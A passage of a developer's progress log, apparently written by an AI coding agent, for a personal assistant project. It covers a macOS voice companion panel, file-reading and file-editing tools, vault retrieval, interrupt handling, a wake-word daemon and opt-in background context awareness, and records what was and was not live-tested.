      — Chose Apple's on-device `Speech` framework (`SpeechRecognizer.swift`) over `whisper.cpp`: zero new bundled dependencies/model files, ships with macOS, `requiresOnDeviceRecognition` when supported keeps it genuinely local — the same "native Apple framework over a new bundled dependency" call already made for OCR (`hi/perception/screen.py`'s Vision framework) and TTS below. `whisper.cpp` remains a documented, real alternative if on-device `Speech`'s accuracy proves insufficient in real use.
- [x] Transcript view updates live, word-by-word, while the mic is open
      — `SFSpeechAudioBufferRecognitionRequest.shouldReportPartialResults = true`, published to the view via `@Published partialTranscript`. **Not live-testable**: needs a real granted microphone/speech permission and a real spoken utterance, neither drivable by this session.
- [x] On end-of-utterance (silence detection or explicit stop), transcript freezes and the request goes to the backend
      — Built the **explicit-stop** half only (tap the panel while listening) — TODO.md's own wording allows either. Real silence detection (VAD) is honestly scoped out as separate, non-trivial work rather than rushed; noted in `voice_companion/README.md`.

### Growth / state machine

- [x] **Collapsed** → thin edge sliver, idle
- [x] **Listening** → panel expands just enough to show the live transcript
- [x] **Processing** → panel grows further to show what the agent is actually doing (which persona/tool got invoked, step-by-step, similar to the tmux pane's visible command execution) — this should feel like watching `term` run a command, not a spinner
      — Simplified, per the still-open "Open decisions" item below (kept open deliberately, not resolved by fiat): one line per persona/tier pick, not a full streaming tool-call log — the panel is 320px wide, and the equivalent full trace already exists in a real terminal `hi` session if wanted.
- [x] **Done** → shows the final result/answer, then auto-collapses after a delay or on click-away
      — 8s auto-collapse (`AppState.swift`), suppressed while hovering; explicit dismiss button also present.
- [x] Every transition is an animated resize, not a hard cut — this is most of what will make it feel considered rather than a debug overlay
      — All four phases funnel through one `PanelController.applyFrame(for:)` driven by a Combine subscription on `AppState.$phase`, so every path that changes phase (hover, a finished response, an error, auto-collapse) resizes the same animated way — deliberately not several separate call-sites that could drift out of sync with each other.
      — `[x]` here means "implemented and internally consistent," not "seen animating on a real screen" — that needs a live interactive session this one can't drive; see `voice_companion/README.md`.

### Output speech (selective TTS)

- [x] Don't speak the full response verbatim — reading out entire code blocks, file diffs, or long lists aloud is the thing that makes voice assistants unusable in practice
- [x] Backend produces two things per response: the full text/detail (always shown in the panel) and a short spoken-summary line — either the model generates both directly, or a lightweight second pass condenses the full answer into one spoken sentence
      — `hi/ipc/spoken_summary.py`'s `make_spoken_summary()`: a short answer (≤220 chars after stripping) is spoken as-is, no model call; a longer one gets one small haiku-tier condensation call. **Live-tested against a real backend response containing a code block**: the full text kept the code block intact for the panel; the spoken summary correctly excluded it and condensed the explanation into one sentence — verified via a real `curl` round-trip, not assumed.
- [x] Hard skip rules regardless of summary quality: code blocks, tables, tool-call/step logs, and anything past a length threshold are never spoken, only ever shown as text
      — Code fences and pipe-table rows are stripped unconditionally before any model call even runs (`_strip_unspeakable()`); tool-call/step logs never reach the spoken-summary path at all, since only the final answer text is passed to it.
- [x] Local TTS engine: macOS `AVSpeechSynthesizer` is the zero-dependency default; evaluate whether a nicer offline neural TTS is worth the extra setup
      — Went with the named default (`SpeechOutput.swift`); a nicer neural TTS was considered but not pursued — no concrete gap identified yet to justify the extra setup, matching this phase's own "evaluate whether... worth it" framing rather than a default upgrade.
- [x] Barge-in: speaking stops immediately if the wake word or hover-listen is triggered again mid-speech, rather than talking over you
      — `SpeechOutput.stopSpeaking()` called unconditionally at the start of every `beginListeningSession()`. Wake-word half is moot since wake-word itself isn't built; hover-listen half is implemented but not live-testable for the same permission reasons as the rest of this phase.

### Visual language — Catalina-era, specifically

- [x] `NSVisualEffectView` vibrancy/blur behind the panel (Catalina's translucent light material, not the flatter/more opaque look later macOS versions moved to)
      — `VisualEffectBlur.swift`, `.hudWindow` material (chosen over `.popover`, which carries a visible arrow/border affordance that doesn't fit an edge-docked sliver).
- [x] San Francisco (SF Pro Text/Display) throughout, Catalina's type sizing — nothing oversized or rounded-corner-heavy like Big Sur+
      — The system default font already is SF Pro; no explicit font asset needed. Sizes kept small and utilitarian (11-14pt body text).
- [x] Modest corner radius (Catalina's ~6–9px range, not the large "squircle" radii introduced later), thin 1px hairline separators between transcript/status sections rather than card shadows
      — 8px (`ContentView.swift`'s `panelCornerRadius` — **not** named `cornerRadius`: an earlier version was, and silently resolved to SwiftUI's own `.cornerRadius()` view-modifier reference instead of the local constant in one specific overload-resolution context, a real compile error caught live and fixed by renaming, not by guessing). `Divider()` throughout instead of shadows.
- [x] Light and dark variants following system appearance, matching Catalina's Notification Center panel as the closest reference point for "translucent HUD docked to a screen edge"
      — SwiftUI's semantic colors (`.primary`/`.secondary`/`.tertiary`, `NSVisualEffectView`'s own vibrancy) follow system appearance automatically — deliberately not two hand-tuned palettes, since the semantic-color approach already gets this for free and correctly.
- [x] Restrained motion — Catalina-era easing curves, not spring/bounce animations
      — A plain `.easeInOut(duration: 0.22)` throughout (SwiftUI transitions and the AppKit frame animation alike) — no `.spring()` anywhere.

### Backend integration

- [x] Local IPC layer (Unix domain socket or localhost HTTP) so the Swift app is a thin client — voice in, transcript + agent-step events out, text in, `hi`'s orchestrator does all classification/planning/execution unchanged
      — Chose localhost HTTP (loopback-only, `127.0.0.1:8765`) over a Unix domain socket — TODO.md's own text explicitly allows either — for simpler streaming on both ends: newline-delimited JSON over a plain HTTP/1.0 body-until-close response, no manually-implemented chunked-transfer framing, consumable by `curl` for testing and Swift's `URLSession.bytes` for the real client alike. `hi/ipc/server.py` calls the _exact_ `hi/router.py`/`hi/personas.py` functions `hi/repl.py`'s `run_router_repl()` already uses — genuinely the same backend, not a reimplementation. **Live-tested end to end via real `curl` requests**: correct persona/tier classification, correct streamed tokens, correct final text + spoken summary, for both a short factual query and a longer one containing code.
- [ ] Reuses the same suggestion engine: a proactive nudge from Phase 4 can also surface here (panel slides out on its own with a suggestion, not just on hover/wake-word)
      — **Not built.** This needs the backend to push to the app unprompted — a materially different shape (a persistent connection or polling) than the request/response protocol actually built, which only ever answers a query the app initiates. A real, separate piece of work: either `hi --suggest-daemon` (already built, Phase 4) also POSTs to a small endpoint the app exposes, or the app polls a new read-only endpoint on `hi --voice-daemon`. Flagged rather than silently left implied-done by the backend-integration item above it being checked.

### Open decisions

- [x] **Streaming STT engine** — the existing Ctrl-V flow uses `faster-whisper` in batch mode (record fully, then transcribe), which can't produce a live word-by-word transcript. Needs a genuinely streaming engine instead: `whisper.cpp` in streaming mode, or Apple's on-device `Speech` framework for live partial results. Trade-off is latency vs. accuracy vs. staying fully local — resolve before starting the transcript view work, since it determines the whole audio pipeline.
      — Resolved: Apple's on-device `Speech` framework (see "Voice + live transcript" above for the reasoning).
- [ ] **Wake-word engine** choice
      — Left open: no wake-word engine was integrated at all (needs a Picovoice account this session can't create), so there was nothing to choose between in practice.
- [x] Whether "processing" step detail should be full tool-call transparency or a simplified summary (full transparency risks a cluttered small panel)
      — Resolved: simplified summary (one persona/tier line) — see "Growth / state machine" above.

---

## Phases 6–20 — Solving `BLOCKERS.md`

Everything below tracks `BLOCKERS.md` (four sections: numbered blockers,
lettered suggested improvements, numbered ambient/real-time gaps, and a
later-appended, un-headered orchestration/AG-UI proposal starting
~line 549) — that file has the full reasoning and code citations behind
every item; this is the execution order, not a restatement. Ordered by
dependency, not by section — Phase 6 is a cheap config change with
outsized leverage on everything after it, and several later phases
explicitly depend on earlier ones existing first (called out per-phase
below). `BLOCKERS.md` item "5. tool-list bloat" (in the numbered-blockers
section) is deliberately **not** a phase here — its own text says so
explicitly: "an observation to revisit after, not a ticket to start on
its own." Phases 16–20 (the orchestration proposal) are a separate
initiative from 6–15, not a continuation of the same dependency chain —
see "Suggested order," below, for how the two groups relate.

### Phase 6 — Local-first latency — **rejected per explicit directive: "DO NOT USE ANY LOCAL MODELS"**

- [x] ~~Point `HAIKU_MODEL` at an already-pulled local model~~ — **not
      done, and not to be done.** Live-benchmarked three local candidates
      on this actual machine (Apple M3 Pro, 18GB) before touching any
      config, specifically because `hi/config.py`'s own existing comment
      already documented a prior finding that a local 8B model measured
      30-85s per call here — worth re-checking with real numbers rather
      than assuming that note was stale: `gemma3:1b` answered in 0.34s
      but produced a garbled, unusable reply (`'term <tier>.'` — echoed
      the prompt's own placeholder text back verbatim instead of filling
      it in); `llama3.2:3b` took 7.01s and got the tier wrong; `qwen3:8b`
      took 14.05s. None of the three cleared the bar on speed _and_
      correctness together — the original comment's finding holds up.
      **Moot regardless**: mid-benchmark, got the explicit instruction
      "DO NOT USE ANY LOCAL MODELS" — this phase is closed, not merely
      deprioritized. `HAIKU_MODEL` stays `gpt-oss:20b-cloud`.
      Consistent with this session's own framing throughout
      (`BLOCKERS.md`: "I am literally using actual big cloud models") —
      local was always the wrong axis to optimize on for this setup.
      `BLOCKERS.md`'s "Ambient & real-time gaps" #6 is corrected in place
      rather than left standing as still-recommended.
- [ ] If turn latency is still worth improving later, it needs a
      cloud-only angle instead — e.g. reducing round trips (does every
      router-mode turn actually need a separate classification call?),
      not a local-model swap. Not scoped further here; revisit only if
      latency becomes a concrete complaint again, with cloud-only
      options.

_Ref: `BLOCKERS.md` → "Ambient & real-time gaps" #6 (correction noted
there directly)._

### Phase 7 — Filesystem foundation (blocks Phase 8 and Phase 13)

- [x] `read_project_file(path)` / `list_project_files(path)` term tools —
      direct `pathlib` access, the same "plain filesystem/subprocess call,
      not routed through `run_shell_command`" pattern
      `hi/agents/term/resume.py`'s `resume_context` already proved works
      fine outside tmux — so these work from the voice companion too,
      which `run_shell_command` categorically cannot
      — `hi/agents/term/files.py`. Refuses binary files, truncates past
      200KB with a clear note, reports a resolved absolute path on
      "doesn't exist" errors so a bad relative-path guess is debuggable.
      Live-tested: real README read, binary-file refusal (`demo.png`),
      nonexistent-path error, large-file truncation (`uv.lock`, 236KB →
      correctly truncated at 200,000 bytes with a byte-count note),
      "not a directory" error — all against this real repo.
- [x] Default-resolve relative paths against `HI_LAUNCH_CWD` (already
      threaded into `term.py`'s `build_agent`) so "read the README"
      doesn't need an absolute path spelled out
      — `files.py`'s `_base_dir()`/`_resolve()`. Live-tested with
      `HI_LAUNCH_CWD` set to this repo: relative paths resolved correctly.
- [x] `search_files(query, path, mode="name"|"content")` term tool —
      name-glob and content grep, respects `.gitignore` where present,
      skips `node_modules`/`.git`/binaries by default, structured
      path+line+snippet results, not raw `grep` output the model has to
      re-parse
      — `.gitignore` respected by shelling out to `git ls-files --cached
    --others --exclude-standard` when the target is a git repo (reuses
      git itself rather than reimplementing gitignore parsing), falling
      back to a plain `os.walk` with a hardcoded noise-directory skip
      list otherwise. Live-tested both modes against this real repo:
      name search found `hi/tracking/leetcode.py` for query "leetcode";
      content search found the exact lines containing a specific phrase
      across `BLOCKERS.md`/`TODO.md`.
- [x] Update `hi/router.py`'s `term` persona description + `term_prompt.md`
      so these tools are actually reachable — the exact bug already found
      once for the perception tools (`term`'s router description not
      mentioning capabilities it actually has) is a real risk here too;
      don't ship the tools without also updating what the classifier
      knows about them
      — both updated. **Live-tested end to end, not just the tools in
      isolation**: `classify("read the README of this project...")` →
      `term`; the real `term` agent then actually called
      `read_project_file(path="README.md")` and produced an accurate
      one-sentence summary. A second live test ("which file... handles
      opening urls") showed the model iterating through two imperfect
      search attempts before correctly landing on `hi/browser.py` —
      real, useful tool composition, not a scripted happy path.

_Ref: `BLOCKERS.md` #1, #2._

### Phase 8 — "Save this project to the vault"

- [x] `save_project_to_vault(directory)` term tool — reads the project's
      README + manifest (`package.json`/`pyproject.toml`/`Cargo.toml`/
      whichever exists) + a shallow directory listing via Phase 7's tools
      directly (not a second file-reading implementation), writes a real
      structured note to `hi/knowledge/projects/<name>.md` (the path
      convention `hi/agents/term/resume.py` already looks up)
      — `hi/agents/term/save_project.py`. Follows the same "tool
      gathers real content, one internal model call (sonnet tier)
      synthesizes, the tool writes" shape `hi/capture/ambient.py`'s
      `normalize_ambient()` already established — one reliable tool call
      instead of hoping the agent chains several correctly, which is
      exactly why this "almost never worked" before. Live-tested against
      this real repo (isolated test vault): produced a genuinely
      accurate, well-structured note — correctly identified the terminal-
      first design, tmux pane, four personas + auto-routing, file-based
      memory, voice input, macOS control, dev-flow launcher, MCP,
      suggestion daemon — not a generic template.
- [x] Ask, don't assume, whether it should also offer to save a dev flow
      in the same turn (reusing `add_dev_flow`) — `BLOCKERS.md` flags this
      explicitly as worth confirming with the user the first time this is
      built, not deciding unilaterally
      — resolved by _not_ bundling it: the tool docstring and
      `term_prompt.md` both say explicitly to use `add_dev_flow`
      separately rather than assume. Live-tested end to end with the
      exact complaint phrasing ("save this project to the vault"): the
      agent correctly called only `save_project_to_vault`, then _offered_
      (in its own reply, unprompted by any hardcoded logic) to also set
      up a dev flow — the right behavior emerged from the prompt
      guidance, not a bundled tool call.

_Ref: `BLOCKERS.md` #3 — depended on Phase 7, done same session._

### Phase 9 — Vault retrieval quality

- [x] 9a (cheapest, do first): feed a short content preview (first
      heading/paragraph, or frontmatter) alongside each note's path in
      the selection prompt — both `hi/memory_graph.py` and
      `hi/agents/docs/vault_rag.py` currently show the model _only_
      filenames, never content, before deciding relevance
      — `hi/note_preview.py`'s `note_preview()`, shared by both graphs
      (see "fix once, shared" below). **Live-tested with a real,
      non-trivial demonstration, not just "it runs"**: asked "what are my
      interests?" — the answer lives in `hi/knowledge/people/
    Harshith_Ashok.md`, a filename with zero literal overlap with
      "interests." Before this fix, title-only selection had no way to
      surface that note for this question; after, both `term` and `docs`
      correctly found and cited it, because the preview line now shown to
      the selection step includes its actual content ("Loves coding,
      building assistants, Python, LangChain, open-source LLMs,
      badminton, cricket").
- [ ] 9b: a local keyword/BM25-style scoring pass over note content
      before the LLM selection step, so selection ranks against actual
      text instead of title-substring luck
      — not yet built. Unlike 9c below, this is a plain scoring
      algorithm (term-frequency based), not a model — unaffected by the
      "no local models" directive, still open to build.
- [ ] 9c (the durable fix): a local embedding index — **un-blocked by
      explicit clarification**: the "no local models" directive is about
      generation/reasoning models specifically, not embedding models —
      `nomic-embed-text` running locally is fine. `bge-m3` presumably
      falls in the same category (also a pure encoder, not a generative
      model) but wasn't explicitly confirmed the way `nomic-embed-text`
      was — verify before relying on it, don't assume. Still not built;
      real work (embed every note, build/maintain the index as a
      derived, rebuildable cache next to `~/.hi/tree_cache.md`, wire it
      into both grounding graphs) — a good next step after Phase 10.
- [x] Fix once, shared: both `hi/memory_graph.py` (term) and
      `hi/agents/docs/vault_rag.py` (docs) run the identical weak
      mechanism today — factor the improved selection logic so both
      personas benefit from one implementation, not two copies drifting
      apart
      — `hi/note_preview.py` is the one shared implementation both
      graphs call; live-tested the identical "what are my interests?"
      question against both `term` and `docs` separately, both correctly
      improved.

_Ref: `BLOCKERS.md` #4 — 9a done and live-verified; 9b and 9c still open,
9c un-blocked after clarification (local embedding models are fine, only
local generation/reasoning models are excluded)._

### Phase 10 — Unified interrupt/cancellation (prerequisite for Phase 11's barge-in)

- [x] One cancellation primitive threaded through `hi/repl.py`'s loop,
      checked by: shell-wait (replacing `hi/agents/term/shell_pane.py`'s
      Ctrl-J-specific raw-terminal byte read with the unified trigger),
      generation streaming (`hi/streaming.py`'s `stream_and_print` has no
      cancellation hook today), and TTS playback once Phase 11 exists
      — `hi/cancellation.py`: `check_interrupt()` is `shell_pane.py`'s
      original private `_check_interrupt` moved out verbatim (same
      proven raw-terminal cbreak-mode byte read, same Ctrl-J-vs-Enter
      distinction), not reimplemented; `shell_pane.py` now imports and
      calls the shared version, its own copy deleted. `Throttle` +
      `CancellationToken` are new — needed because `stream_and_print`
      polls far more often (once per streamed chunk) than the shell-wait
      loop's original ~0.2s cadence, and reconfiguring terminal modes
      that often would be wasteful/disruptive; `Throttle` caps the
      actual raw-terminal check back down to that same proven-safe
      cadence regardless of poll frequency. TTS playback isn't wired in
      — Phase 11 doesn't exist yet — but the primitive is what it will
      reuse, per the item's own framing.
      — **Thoroughly unit-tested with mocked stdin** (no real keypress
      possible in this environment): `check_interrupt` correctly
      distinguishes Ctrl-J from Enter, correctly falls back to a plain
      sleep on a non-TTY, correctly reports nothing-waiting; `Throttle`
      correctly gates repeated calls within its interval and reopens
      after; `CancellationToken.poll` correctly stays sticky (cancelled
      state) without re-touching stdin once triggered, verified via call
      counting.
      — `hi/streaming.py`'s `stream_and_print`: verified `agent.stream(...)`
      returns a real, closeable Python generator _before_ relying on
      `.close()` for cancellation, not assumed. **A real bug found and
      fixed by testing the interrupt path against an actual live agent,
      not just a synthetic mock**: the first version fell back to
      `final_messages` (`None` check) when cancelled, but LangGraph's
      "values" stream mode can emit an early state snapshot _before_
      generation completes too (right after the human message is added
      to state) — this satisfies "not None" while still being stale,
      pre-generation state, so the first version silently returned the
      user's own prompt back as if it were the answer. Fixed by
      building the interrupted return value from what was actually
      _shown_ (the real printed chunks) instead of ever trusting
      `final_messages` when cancelled, tracked and verified with both a
      synthetic generator (confirmed the exact printed text, `"Hello
    world "`, was correctly preserved and the `.close()` call fired)
      and a real live agent stream reproducing the original bug and
      confirming the fix (no longer leaks the stale prompt-echo).
      Normal, uninterrupted streaming re-verified unaffected by any of
      this, before and after the fix.
- [x] Same trigger regardless of which of the three is currently in
      flight — no more three separate (or missing) mechanisms
      — two of the three now share the one mechanism (shell-wait,
      generation-streaming); the third (TTS) has no implementation to
      unify with yet, honestly not claimed as done until Phase 11 exists.

_Ref: `BLOCKERS.md` → "Ambient & real-time gaps" #3._

### Phase 11 — Ambient voice loop: wake-word + always-on TTS (build after Phase 6 and Phase 10)

- [x] `hi/wake.py`, a standalone daemon (`hi --wake-daemon`, same shape as
      `run_suggest_daemon`/`run_capture_daemon` — this codebase's third
      instance of the same pattern) using `openWakeWord` — fully
      open-source, local, ONNX-based, **no account or API key needed**.
      **This corrects Phase 5's own "Wake-word engine choice" note above**,
      which named Porcupine specifically and left the item open because
      Porcupine needs a paid Picovoice account; `openWakeWord` removes
      that blocker rather than working around it. `openwakeword>=0.4.0`
      added via `uv add` (pulls in `onnxruntime` for local ONNX inference —
      not a "local AI model" in the generation sense the user's directive
      bans, the same category distinction already settled for
      `nomic-embed-text` in Phase 9c: a fixed-purpose detector/encoder, not
      a reasoning/generation model). Deliberately `hi/wake.py`, a flat
      module — not `hi/voice/wake.py` as originally sketched here — since
      `hi/voice.py` is already a flat module, not a package, and converting
      it into one just to nest a new file under it would be pure churn.
      **Real API mismatch found and fixed live**: the constructor is
      `Model(wakeword_model_paths=[...])`, not
      `Model(wakeword_models=[...], inference_framework="onnx")` as
      initially assumed — found via `TypeError`, confirmed the correct
      signature via `inspect.signature(Model.__init__)`/
      `AudioFeatures.__init__`. **Verified live with real audio**, not
      assumed: synthesized "Hey Jarvis" via `say -o file.aiff` →
      `afconvert` to 16kHz mono WAV, fed through the actual bundled
      `hey_jarvis_v0.1.onnx` model — **0.9993 detection score** for the
      real phrase, **0.0000** for an unrelated negative-control phrase
- [x] On trigger: reuses `hi/voice.py`'s existing `listen_and_transcribe()`
      pipeline unchanged, then pipes straight to `hi/router.py`'s
      `classify()` instead of requiring the manual review-then-Enter step
      Ctrl-V uses in the interactive REPL — the whole point of a wake-word
      loop is hands-free operation. Two separate, sequential
      `sd.InputStream` sessions (wake-word listening, then the command
      recording), never concurrent — most audio backends don't cleanly
      support two simultaneous input streams on one device, so this was a
      deliberate design choice, not an oversight
- [x] Local TTS for every terminal response, not just the voice
      companion's spoken summary — zero TTS existed anywhere in Python
      `hi/` before this phase (verified live while writing `BLOCKERS.md`).
      New `hi/tts.py`'s `SpeechQueue`: a background thread speaks completed
      sentences (regex sentence-boundary split, handling partial text
      across multiple `feed()` calls correctly) via
      `subprocess.Popen(["say", ...])` as they arrive from
      `hi/streaming.py`'s existing token stream, rather than waiting for
      the full response — `stream_and_print()` gained an opt-in
      `speech_queue` parameter (silent by default for every existing
      caller, e.g. `hi/repl.py`'s typed/Ctrl-V sessions; only
      `hi/wake.py` passes one in). `kokoro`/`piper` remain a later upgrade
      only if `say`'s quality proves insufficient — not needed yet.
      **Verified live**: sentence-chunking correctly holds incomplete
      sentences across `feed()` calls and only queues genuinely complete
      ones; a real agent stream (Wikipedia/`web` persona) ran end to end
      with a live `SpeechQueue` attached with no regressions to the
      existing non-speech streaming path
- [x] Barge-in: reuses Phase 10's `hi/cancellation.py` primitive for
      Ctrl-J (mid-response text cancellation also calls
      `speech_queue.stop()`, so interrupting a response barges in on
      whatever's being spoken from it too — one interrupt, not two), plus
      a second barge-in path specific to voice: a fresh wake-word trigger
      while still speaking calls `speech_queue.stop()` immediately, no new
      mechanism invented. **Verified live**: spawned a long `say`
      utterance via `SpeechQueue`, confirmed `_process.poll() is None`
      (genuinely running) before calling `.stop()`, confirmed the process
      was gone immediately after
- [x] `hi/cli.py` wired: `--wake-daemon` flag added to the same
      mutually-exclusive argparse group as `--capture-daemon`/
      `--suggest-daemon`/`--voice-daemon`, dispatches to
      `hi.wake.run_wake_daemon()`. **Verified live**:
      `parse_persona(['--wake-daemon'])` returns the correct marker,
      `hi --help` lists the new flag with its help text, full repo
      compile-check (`py_compile` on every `.py` file) passes clean

**Honest limitation, not silently glossed over**: the daemon's actual
`while True` microphone loop (`_listen_for_wake_word` → record → transcribe
→ route → speak, repeated) has **not** been exercised end-to-end with real
interactive audio — this environment has no real microphone to drive it
with, the same standing limitation already documented for the Swift voice
companion's permission-gated features. What _was_ verified live and for
real: wake-word detection against real synthesized audio (0.9993/0.0000
scores above), the TTS sentence-queueing and barge-in mechanics in
isolation, the streaming+speech integration against a real agent, and the
full CLI dispatch path. The one untested seam is the daemon's own
`while True` orchestration loop gluing those already-verified pieces
together — low risk (it's a thin sequential glue, no new logic of its own)
but genuinely unverified, flagged here rather than claimed as tested.

_Ref: `BLOCKERS.md` → "Ambient & real-time gaps" #1._

### Phase 12 — Gated background awareness

- [x] `hi/watchdogs/context_shift.py` — polls
      `hi/perception/privacy.py`'s existing `frontmost_app_name()`
      (already built and tested, just previously only called reactively,
      inside `sensitive_context_reason()`) every 45s (within the
      30–60s window this item asked for), purely for state-change
      detection — app switched, or the same app frontmost continuously
      for a long time — never content, never OCR, never a screenshot.
      Split into two functions on purpose: `poll_once()` (cheap, meant to
      be called tightly, just updates persisted `{app, since}` state in
      `~/.hi/context_shift_state.json`) and `dwell_suggestion()` (a pure
      read of that state, no side effects) — so the tight polling cadence
      and the coarser suggestion-surfacing cadence can run on two
      different loops without conflating "checked" with "notified"
- [x] Feed detected changes into `hi/suggest/engine.py`'s existing
      `gather_suggestions()`/`run_once()` confidence-gate and per-day
      dedup, not a parallel notification path. New
      `_context_shift_suggestions()`: turns `dwell_suggestion()`'s
      `(app, minutes)` into a `Suggestion` keyed by `app` + today's date
      (so it's capped at one nudge per app per day, like every other
      signal here, not one per 30-min cycle for as long as you stay put),
      threshold 20 minutes. `run_suggest_daemon()` restructured so
      `context_shift.poll_once()` runs on its own 45s inner loop while
      `run_once()`'s actual gate/notify/dedup pass still only fires on
      the existing (default 30min) `interval_seconds` cadence — satisfies
      "polls every 30-60s" literally without re-notifying that often.
      `check_suggestions()` (the `term` tool, and its `term_prompt.md`
      entry) updated to mention this new signal, per this session's
      established rule that a capability existing isn't enough if the
      prompt/tool description doesn't say so
- [x] `hi/perception/diff_watch.py` — separate, explicit opt-in via a new
      `DIFF_WATCH_ENABLED` flag in `~/.hi/.env` (`hi/config.py`), **off
      by default** (parses `1`/`true`/`yes` case-insensitively; anything
      else, including unset, is disabled). Hashes a screenshot
      (`screencapture -x` -> sha256 of the raw PNG bytes -> file deleted
      immediately, same discard-immediately discipline as
      `hi/perception/screen.py`) every ~2min (`POLL_INTERVAL_SECONDS =
    120`) purely for change-detection — the pixels themselves are never
      OCR'd, never inspected, never stored, only the hash (and only long
      enough to compare against the next one). Runs through
      `sensitive_context_reason()` first on every single check, same as
      every other perception tool, with no opt-out — a check near a
      password manager or private/incognito window skips that cycle
      entirely (doesn't even take the screenshot). Does **not** change
      `read_screen`/`ask_about_screen`'s existing on-demand-only
      behavior at all — this is new, separately-gated surface area next
      to them, wired into `run_suggest_daemon()`'s inner loop (own 2min
      cadence, only started if `DIFF_WATCH_ENABLED`) and
      `gather_suggestions()` via a new `_diff_watch_suggestions()`
      (threshold 10 minutes unchanged, matching `BLOCKERS.md`'s own
      "stuck on the same stack trace for 10 minutes" example) exactly
      the same way as `context_shift`
      — **Deliberately a coarse exact-hash comparison, not a perceptual
      diff** — documented in the module's own docstring as making the
      "unchanged" signal conservative (a blinking cursor or a ticking
      clock reads as "changed" too, so it's harder to false-positive on
      "stuck," not easier) rather than silently overselling its
      precision. **This showed up live, not just in theory**: two
      screenshots taken half a second apart during testing hashed
      differently even though nothing meaningful on screen changed —
      exactly the documented trade-off, not a bug

**Live-verified, not just written**: `context_shift.poll_once()` against
the real `frontmost_app_name()` (correctly captured `"Safari"`, then
correctly reset to a different app on a simulated switch, correctly
produced `("Safari", 21)` once dwell was artificially aged past the
20-minute threshold, correctly returned `None` again right after a
simulated switch); `diff_watch.poll_once()` against a real screenshot
(correct hash written, correctly produced a `None`→`11`-minutes result
across the same artificial-aging test, correctly **refused outright**
— no state file written at all — when `sensitive_context_reason()` was
made to simulate a password manager being frontmost); the `.env` flag's
true/false parsing against real `_parse_env()` output; the full
`gather_suggestions()`/`check_suggestions()` integration end to end with
the flag at its real default (off) — existing signals (LeetCode, in this
run) unaffected, both new signals correctly contributing nothing yet;
and `run_suggest_daemon()`'s actual restructured loop body, run for 3
real cycles (mocked only `time.sleep` to stop it) — confirmed
`context_shift.poll_once()` fires every cycle against real state, no
crash, correct start-up banner. Full repo `py_compile` clean throughout.
One real, harmless artifact from this testing — `~/.hi/
context_shift_state.json`, created by the real daemon-loop smoke test
above — left in place rather than deleted, since it's exactly the state
file this feature is supposed to produce during normal operation (same
category as the pre-existing `suggest_state.json`/`dev_flows.json`), not
stray test pollution.

**Honest limitation**: like Phase 11's wake-word daemon, the actual
`hi --suggest-daemon` process running unattended for hours with a real
human switching apps around it hasn't been observed end-to-end in this
environment — what's verified above is every individual piece (the
state machine, the gating, the integration, the loop structure) working
correctly against real inputs, not a multi-hour live run.

_Ref: `BLOCKERS.md` → "Ambient & real-time gaps" #2, #4._

### Phase 13 — Real coding-agent capabilities for `term` (build after Phase 7)

- [x] Propose and apply real file edits (not just read), run tests,
      iterate on failures — using `term`'s existing model
      (`gpt-oss:120b-cloud`; there is no dedicated coding-specialist
      model available on this account, per the correction in
      `BLOCKERS.md` — this is a tooling gap, not a model-choice one).
      Two new tools in `hi/agents/term/files.py`, alongside the existing
      read-only `read_project_file`/`list_project_files`/`search_files`:
      `edit_project_file(path, old_text, new_text)` — a targeted,
      Edit-tool-style find/replace that fails loudly (no partial edit)
      if `old_text` isn't found or isn't unique in the file, rather than
      guessing — and `write_project_file(path, content)` for a brand-new
      file or a genuine full rewrite. "Run tests, iterate on failures"
      needed **no new tool at all** — `run_shell_command` already existed
      and already runs real commands with real output; the actual gap
      this phase closed was the missing write/edit half, and
      `term_prompt.md` gained a "Making real code changes" section
      spelling out the read → edit → run tests → read the real failure →
      edit again loop explicitly, since a capability existing isn't
      enough if the prompt never tells the model to actually use it that
      way (the same bug class this session keeps re-finding elsewhere)
- [x] Build on `hi/action_tiers.py`'s existing destructive-action
      confirmation gate — don't build a parallel safety mechanism.
      Followed its own established tiering exactly: creating a brand-new
      file is reversible (trivially undone by deleting it) so
      `write_project_file` doesn't gate that case at all, matching
      `create_note`'s reasoning; overwriting an _existing_ file's whole
      content is destructive (old content gone, unrecoverable through
      this tool afterward) so that case goes through
      `confirm_destructive()` — the exact same y/N prompt
      `run_shell_command` already uses for a destructive shell command,
      not a second mechanism. `edit_project_file` stays ungated
      entirely, same reasoning as `append_note`: the exact text removed
      is always visible in the tool call itself, so it's trivially
      reversible by swapping the two arguments back
- [ ] If accuracy on real coding tasks turns out to be the limiting
      factor once this exists (not assumed up front): benchmark
      `nemotron-3-ultra` (confirm its exact `:tag` first) against
      `gpt-oss:120b-cloud` specifically for this job — **deliberately
      still open**: no real coding task has been run through this yet to
      know whether accuracy is actually the bottleneck, so benchmarking
      now would be guessing at a problem that might not exist. Revisit
      once real usage says otherwise, not before

**Live-verified**, not just written: `write_project_file` creating a
brand-new file (no confirmation prompt shown, verified by inspecting the
real created file's content); `edit_project_file` making a unique
replacement (content correctly changed, read back to confirm);
`edit_project_file` correctly refusing an edit whose `old_text` wasn't
found, and correctly refusing an ambiguous one that matched twice
(neither made any change to the file — verified the file was untouched
after both); `edit_project_file` against a non-existent path correctly
pointing at `write_project_file` instead of silently creating one; the
overwrite confirmation gate exercised both ways for real
(`builtins.input` stubbed to `'n'` then `'y'`) — declining left the
file's real content unchanged, accepting genuinely overwrote it — all
run against files in an isolated scratch directory, cleaned up
afterward, never against the real vault or this repo. Full repo
`py_compile` clean, both tools confirmed present in `term`'s real
`TOOLS` list (43 tools now, up from 41), and the whole-project tool
count (`70`, up from `68`) recomputed directly from all four personas'
real `TOOLS` lists rather than incremented by hand.

_Ref: `BLOCKERS.md` → "Suggested feature improvements" C — the single
highest-leverage item in that section, per its own framing — depends on
Phase 7._

### Phase 14 — Smarter opt-in reasoning layers

- [x] **Prerequisite fix, found and resolved before anything else in
      this phase could be trusted**: `OPUS_MODEL` (`qwen3.5:397b-cloud`)
      was live-confirmed subscription-gated — a real `402` at call time,
      not the hypothetical `BLOCKERS.md` flagged. Swapped to
      `nemotron-3-ultra:cloud` (`hi/config.py`) — pulled live (`ollama
    pull nemotron-3-ultra:cloud`), confirmed working with a real
      `.invoke()` call, and confirmed `get_tier_model("opus")` resolves
      to it correctly. **Real, measured trade-off, not hidden**: this is
      the largest model in the confirmed-usable set and it shows — a
      real, isolated, directly-timed call of a **trivial** prompt ("Say
      OK.") took **123.4 seconds**. Several other live calls in this
      phase's own testing took well over a minute too, some multiple
      minutes, especially when several opus-tier calls were run
      concurrently against the same account (real contention, not just a
